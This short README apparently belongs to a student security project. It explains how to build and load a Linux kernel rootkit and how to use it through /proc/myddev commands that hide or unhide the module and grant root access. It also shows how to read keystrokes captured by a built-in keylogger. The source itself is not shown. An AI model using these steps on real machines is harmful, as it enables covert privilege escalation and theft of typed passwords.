# Security_Project

#How to build the project

Put the Make file and the rootkit.c in the same directory and run "make" command in terminal

#Usage

Loading a kernel module is done by typing:
insmod rootkit.ko

Unloading is performed by typing:
rmmod rootkit

Hiding the module is done by typing the following: 
echo “hide” > /proc/myddev

Unhiding: 
echo “unhide” > /proc/myddev.

Root access:
echo “rektt” > /proc/myddev.

View keys recorded by the keylogger:

cat /sys/kernel/debug/rootkit/keys 




